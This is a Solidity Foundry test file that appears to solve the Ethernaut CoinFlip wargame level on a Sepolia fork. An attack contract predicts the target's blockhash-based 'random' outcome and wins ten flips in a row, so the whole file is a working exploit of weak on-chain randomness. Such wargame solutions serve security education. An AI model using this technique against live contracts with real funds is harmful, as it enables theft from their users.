// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/CoinFlip.sol";

contract ContractTest2 is Test {
    CoinFlip coinFlip = CoinFlip(payable(0x7c2D10e589fEe5823da4f7B3119801eA5D82Ec0F));
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address attacker = 0x8c9D2Ed582846497b454cAFA67160F679AF90A2f;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("sepolia"), 4546277);
        vm.startPrank(attacker);
    }

    function testLevel3() public {
        AttackContract attackContract = new AttackContract();
        uint256 blockNumber = block.number;

        for (uint256 i = 0; i != 10; i++) {
            vm.rollFork(blockNumber++);
            attackContract.attack();
        }
        console.log(coinFlip.consecutiveWins());
        assertEq(coinFlip.consecutiveWins(), 10);
    }
}

contract AttackContract {
    CoinFlip coinFlip = CoinFlip(payable(0x7c2D10e589fEe5823da4f7B3119801eA5D82Ec0F));
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address attacker = 0x8c9D2Ed582846497b454cAFA67160F679AF90A2f;

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 flip = blockValue / FACTOR;
        bool side = flip == 1 ? true : false;
        if (side) {
            coinFlip.flip(true);
        } else {
            coinFlip.flip(false);
        }
    }

    receive() external payable {}
}
